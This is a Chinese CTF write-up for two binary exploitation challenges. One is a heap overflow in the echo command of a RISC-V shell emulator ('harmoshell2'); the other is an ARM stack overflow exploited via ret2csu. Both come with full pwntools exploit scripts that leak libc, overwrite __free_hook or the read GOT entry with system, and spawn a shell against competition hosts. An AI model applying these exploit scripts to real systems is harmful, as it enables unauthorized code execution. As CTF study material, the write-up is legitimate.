这里和`HARMOSHELL`的二进制相差不大，基本的数据结构相同，但是没有了栈溢出漏洞，漏洞的位置变为了`echo`函数中的`write2file`函数中，也就是向文件中写内容的函数
    //echo function
    content_buf = get_file_node(lVar1->file_content);
    __nbytes = 0x100;
    if (-1 file_name + 0x10);
        if (flag != 0) {
          memcpy((void *)((longlong)content_buf +
                          *(longlong *)(*(longlong *)file_node->file_name + 0x20)),input_buf,length);
          *(ulonglong *)(*(longlong *)file_node->file_name + 0x20) =
            (ulonglong)length + *(longlong *)(*(longlong *)file_node->file_name + 0x20);
          return;
        }
        memcpy(content_buf,input_buf,length);
        *(ulonglong *)(*(longlong *)file_node->file_name + 0x20) = (ulonglong)length;
      }
      return;
    }
这里可以看到使用`echo >
file`可以对文件可以随意长度的写，没有了`HARMOSHELL`中对长度的检查，因此这里存在堆溢出的漏洞。这里我们可以利用简单的方法，即首先创建多个文件，每个文件的内存范围为`0x30`大小的文件控制结构体和`0x110`大小的存储文件内容的堆块。因此我们可以通过堆溢出控制文件结构体中的`content_buf`。做到任意的内存地址读写。
那么利用思路就很简单了，覆写堆块的`size`释放之后堆块释放到`unsorted
bin`中即可以泄漏出`libc`基址，需要注意的是这里地址中包含`00`，因此这里我采用的是`8`次循环读得到`libc`的基址。接下来就很简单了，直接利用内存任意写覆写`free_hook`为`system`。
    # encoding=utf-8
    from pwn import *
    file_path = "./harmoshell2"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        # p = process(['./qemu-riscv64', '-L', "libs", '-g', '1234', file_path])
        p = process(['./qemu-riscv64', '-L', "libs", file_path])
        libc = ELF('./libs/lib/libc-2.27.so')
        one_gadget = 0x0
    else:
        p = remote('139.159.132.55', 9999)
        libc = ELF('./libs/lib/libc-2.27.so')
        one_gadget = 0x0
    def touch(file):
        p.sendlineafter("$ ", "touch " + file)
    def echo(file, content, type=0):
        if type:
            p.sendlineafter("$ ", "echo > " + file)
        else:
            p.sendlineafter("$ ", "echo >> " + file)
        p.send(content)
    def rm(file):
        p.sendlineafter("$ ", "rm " + file)
    def cat(file):
        p.sendlineafter("$ ", "cat " + file)
    def ls():
        p.sendlineafter("$ ", "ls")
    for i in range(9):
        touch("flag" + str(i))
    raw_input()
    echo("flag"+ str(0), b"a"*0x100, 1)
    echo("flag"+str(0), b"b"*0x20)
    cat("flag" + str(0))
    p.recvuntil("b"*0x20)
    heap_address = u64(p.recvline().strip().ljust(8, b"\x00"))
    log.success("heap address is {}".format(hex(heap_address)))
    echo("flag"+ str(0), b"a"*0x100, 1)
    payload = b"b"*0x8 + p64(0x31) + b"flag1".ljust(0x10, b"\x00")
    payload += p64(heap_address + 0x100 + 0x30) + p64(0x100) + p64(0) # flag2 buf - 0x10
    echo("flag" + str(0), payload)
    echo("flag" + str(1), p64(0) + p64(0x140*4 + 1 - 0x30), 1)
    rm("flag" + str(2))
    address = b""
    for i in range(8):
        echo("flag"+ str(0), b"a"*0x100, 1)
        payload = b"b"*0x8 + p64(0x31) + b"flag1".ljust(0x10, b"\x00")
        payload += p64(heap_address + 0x100 + 0x30 + 0x10 + i) + p64(0x100) + p64(0)
        echo("flag" + str(0), payload)
        cat("flag" + str(1))
        p.recvuntil("Content: ")
        res = p.recvline().strip()
        print(res)
        if len(res) == 0:
            address += b"\x00"
        else:
            address += p8(res[0])
    # cat("flag" + str(1))
    # p.recvuntil("Content: ")
    libc.address = u64(address) - 88 - libc.sym['__malloc_hook'] - 0x10
    log.success("leak address is {}".format(hex(u64(address))))
    log.success("libc address is {}".format(hex(libc.address)))
    print(hex(libc.address - 0x4000801000))
    echo("flag"+ str(0), b"a"*0x100, 1)
    payload = b"b"*0x8 + p64(0x31) + b"flag1".ljust(0x10, b"\x00")
    payload += p64(libc.sym['__free_hook']) + p64(0x100) + p64(0)
    echo("flag" + str(0), payload)
    echo("flag" + str(1), p64(libc.sym['system']), 1)
    echo("flag" + str(4), "/bin/sh\x00")
    rm("flag" + str(4))
    p.interactive()
## PWNI
    undefined4 main(void)
    {
      undefined auStack264 [256];
      setvbuf(stdout,(char *)0x0,2,0);
      printf("input: ");
      read(0,auStack264,0x300);
      return 0;
    }
很明显的栈溢出，但是这里是`arm`架构的，并且没有开启`pie`，这里可以直接利用`ret2csu`调用`printf`函数输出`read`函数的地址，泄漏出`libc`基址。
                                 LAB_00010540                                    XREF[1]:     00010560(j)  
            00010540 05 00 59 e1     cmp        r9,r5
            00010544 f0 87 bd 08     ldmiaeq    sp!,{r4 r5 r6 r7 r8 r9 r10 pc}
            00010548 04 30 94 e4     ldr        r3,[r4],#0x4=>->frame_dummy                      = 10474h
                                                                                                 = 1049Ch
            0001054c 08 20 a0 e1     cpy        r2,r8
            00010550 07 10 a0 e1     cpy        r1,r7
            00010554 06 00 a0 e1     cpy        r0,r6
            00010558 33 ff 2f e1     blx        r3=>frame_dummy                                  undefined frame_dummy()
                                                                                                 undefined __do_global_dtors_aux()
            0001055c 01 90 89 e2     add        r9,r9,#0x1
            00010560 f6 ff ff ea     b          LAB_00010540
泄漏出地址之后，覆写`read
got`为`system`的地址，然后在选一个已知的地址为`/bin/sh`这里使用的是`read.got+0x4`。之后再次执行`read`，参数是`read.got+0x4`。这样就可以`getshell`。
    # encoding=utf-8
    from pwn import *
    file_path = "./bin"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 1
    if debug:
        # p = process(["qemu-arm", "-L", ".",file_path])
        p = process(["qemu-arm", "-L", ".", "-g", "1234", file_path])
        # gdb.attach(p)
        libc = ELF('./lib/libc.so.6')
        one_gadget = 0x0
    else:
        p = remote('139.159.210.220', 9999)
        libc = ELF('libc-2.31.so')
        one_gadget = 0x0
    csu1 = 0x00010540
    g1 = 0x00010498
    def csu(address, arg1, arg2, arg3):
        payload = p32(address) + p32(1) + p32(arg1) + p32(arg2) + p32(arg3)
        payload += p32(0)*2 + p32(0x10548)
        return payload
    raw_input()
    payload = b"a"*0x104 + p32(csu1)
    payload += csu(elf.got['printf'], elf.got['read'], 1, 2)
    payload += csu(elf.got['read'], 0, elf.got['read'], 0x10)
    payload += csu(elf.got['read'], elf.got['read'] + 4, 0, 0)
    payload = payload.ljust(0x300, b"\x00")
    p.sendafter("input: ", payload)
    libc.address = u32(p.recv(4)) - libc.sym['read']
    log.success("libc address is {}".format(hex(libc.address)))
    log.success("read got is {}".format(hex(elf.got['read'])))
    log.success("read address is {}".format(hex(libc.sym['read'])))
    p.sendline(p32(libc.sym['system']) + b"/bin/sh\x00")
    p.interactive()